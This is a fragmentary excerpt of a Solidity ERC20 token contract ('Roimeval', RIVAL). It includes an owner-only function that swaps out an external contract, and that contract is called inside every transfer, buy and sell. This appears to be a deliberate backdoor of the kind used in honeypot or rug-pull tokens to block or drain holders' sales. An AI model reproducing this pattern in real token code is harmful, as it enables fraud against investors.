...
contract UserAmountChange is IUserAmountzhange{
    using SafeMath for uint256;
...
contract TokenM is ERC20 {
    ...
    IUserAmountzhange public userzhange;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;

    constructor(address tokenOwner) ERC20("Roimeval", "RIVAL") {
        ...
        userzhange = new UserAmountChange();
    ...
    function zhangeUserAmountOutIn(IUserAmountzhange _userzhange) public onlyOwner {
        userzhange = _userzhange;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                userzhange.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				userzhange.addOutAmount(from, amount);
            }else{
                userzhange.addOutAmount(from, amount);
                takeFee = false;
            }
